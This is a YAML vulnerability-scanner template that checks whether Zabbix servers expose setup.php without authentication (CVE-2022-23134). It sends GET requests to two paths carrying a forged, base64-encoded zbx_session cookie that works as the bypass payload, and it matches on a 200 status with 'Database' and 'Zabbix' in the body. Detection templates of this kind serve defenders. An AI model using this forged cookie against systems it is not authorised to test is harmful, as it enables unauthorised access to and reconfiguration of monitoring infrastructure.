id: zabbix-setup-unauth-access
info:
  name: Zabbix setup.php Unauthenticated Access
  author: ProjectDiscoveryAI
  severity: high
  description: |
    Zabbix setup.php file is accessible without authentication, allowing attackers
    to potentially modify the configuration of the Zabbix Frontend.
  tags: permission-bypass,zabbix
  classification:
    cve-id: CVE-2022-23134
http:
  - raw:
      - |
        GET /zabbix/setup.php HTTP/1.1
        Host: {{Hostname}}
        Cookie: zbx_session=eyJzZXNzaW9uaWQiOiJJTlZBTElEIiwiY2hlY2tfZmllbGRzX3Jlc3VsdCI6dHJ1ZSwic3RlcCI6Niwic2VydmVyQ2hlY2tSZXN1bHQiOnRydWUsInNlcnZlckNoZWNrVGltZSI6MTY0NTEyMzcwNCwic2lnbiI6IklOVkFMSUQifQ%3D%3D
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "Database"
          - "Zabbix"
        part: body
      - type: status
        status:
          - 200
  - raw:
      - |
        GET /setup.php HTTP/1.1
        Host: {{Hostname}}
        Cookie: zbx_session=eyJzZXNzaW9uaWQiOiJJTlZBTElEIiwiY2hlY2tfZmllbGRzX3Jlc3VsdCI6dHJ1ZSwic3RlcCI6Niwic2VydmVyQ2hlY2tSZXN1bHQiOnRydWUsInNlcnZlckNoZWNrVGltZSI6MTY0NTEyMzcwNCwic2lnbiI6IklOVkFMSUQifQ%3D%3D
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "Database"
          - "Zabbix"
        part: body
      - type: status
        status:
          - 200
